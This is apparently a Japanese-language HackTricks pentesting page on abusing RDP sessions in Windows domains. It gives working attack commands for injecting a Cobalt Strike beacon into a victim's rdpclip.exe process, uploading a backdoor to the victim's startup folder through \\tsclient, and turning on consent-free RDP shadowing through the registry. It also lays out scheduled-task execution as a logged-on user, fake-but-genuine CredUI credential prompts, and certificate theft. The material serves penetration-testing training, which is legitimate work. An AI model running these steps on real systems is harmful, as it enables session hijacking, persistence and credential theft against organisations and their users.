# RDPセッションの悪用

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

現在のドメイン内の任意の**computer**に対して**external group**が**RDP access**を持っている場合、**attacker**はその**compromise that computer and wait for him**ことができる。

そのユーザーがRDPでアクセスした後、**attacker can pivot to that users session**し、外部ドメインでその権限を悪用できる。
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

ユーザーが **RDP into a machine** でアクセスし、そこに **attacker** が **waiting** している場合、**attacker** はユーザーの RDP セッションに **inject a beacon in the RDP session of the user** ことができ、もし RDP 接続時に **victim mounted his drive** されていれば、**attacker could access it**。

この場合、**compromise** して **victims** の **original computer** に **backdoor** を **statup folder** に書き込むだけでよいでしょう。
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

もし被害者が既にホスト上で**active RDP session**を持っていて、あなたがそのホストの**local admin**であれば、パスワードを盗んだりLSASSをダンプしたりすることなく、そのデスクトップを**view/control that desktop without stealing the password or dumping LSASS**できる可能性があります。

これは、以下に保存されている**Remote Desktop Services shadowing**ポリシーに依存します:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
注目すべき値:

- `0`: 無効
- `1`: `EnableInputNotify` (制御、ユーザーの承認が必要)
- `2`: `EnableInputNoNotify` (制御、**ユーザーの承認不要**)
- `3`: `EnableNoInputNotify` (表示のみ、ユーザーの承認が必要)
- `4`: `EnableNoInputNoNotify` (表示のみ、**ユーザーの承認不要**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
これは特権ユーザーがRDPで接続したままロック解除されたデスクトップ、KeePassセッション、MMCコンソール、ブラウザセッション、またはadmin shellを開いたままにしていた場合に特に有用です。

## ログオン中ユーザーとしてのスケジュールされたタスク

もしあなたが **local admin** で、ターゲットユーザーが **現在ログオン中** であれば、Task Schedulerは**そのユーザーとしてパスワード無しで**コードを起動できます。

これにより、被害者の既存のログオンセッションが実行プリミティブになります：
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
注意事項:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.

## CredUI Prompt Abuse From the Victim Session

被害者の対話型デスクトップ内で実行できるようになると（例: **Shadow RDP** や **そのユーザーとして実行される scheduled task** を介して）、CredUI APIs を使って**本物の Windows 資格情報プロンプト**を表示し、被害者が入力した資格情報を収集できます。

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. 被害者セッション内でバイナリを起動する。
2. 現在のドメインのブランディングに一致するドメイン認証プロンプトを表示する。
3. 返却された認証バッファをアンパックする。
4. 提供された資格情報を検証し、必要に応じて有効な資格情報が入力されるまでプロンプトを繰り返す。

これは、プロンプトが偽の HTML フォームではなく標準の Windows API によってレンダリングされるため、**on-host phishing** に有用です。

## Requesting a PFX In the Victim Context

同じ **scheduled-task-as-user** プリミティブを使って、**ログオンしている被害者としての証明書/PFX を要求**することができます。その証明書は後にそのユーザーとしての **AD authentication** に使用でき、パスワード窃取を完全に回避できます。

High-level flow:

1. 被害者がログオンしているホストで**ローカル管理者（local admin）**を取得する。
2. 被害者として **scheduled task** を使って証明書の登録／エクスポート処理を実行する。
3. 生成された **PFX** をエクスポートする。
4. PFX を PKINIT / 証明書ベースの AD 認証に使用する。

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
